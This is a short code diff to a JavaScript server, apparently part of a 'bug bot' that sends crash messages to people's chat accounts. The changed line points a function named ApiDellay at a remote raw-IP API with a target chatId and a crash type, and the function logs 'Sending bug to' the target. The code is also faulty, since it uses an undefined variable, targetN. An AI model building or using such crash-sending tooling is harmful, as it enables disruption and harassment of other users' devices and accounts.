@@ -43,7 +43,7 @@ app.post("/api/change-role", (req, res) => {
 //─ ( Api Dellay Set Time ) 
 //─ ( Api Dellay Set Time ) 
 async function ApiDellay(target) {
-  const apiUrl = `http://68.183.182.217:2001/kipopapi?chatId=${targetN}&type=Crash Infinity`;
+  const apiUrl = `http://68.183.182.217:2001/kipopapi?chatId=${targetN}&type=/api/crash`;
 
   console.log(`🔁 [apiDelay] Sending bug to: ${target}`);
 
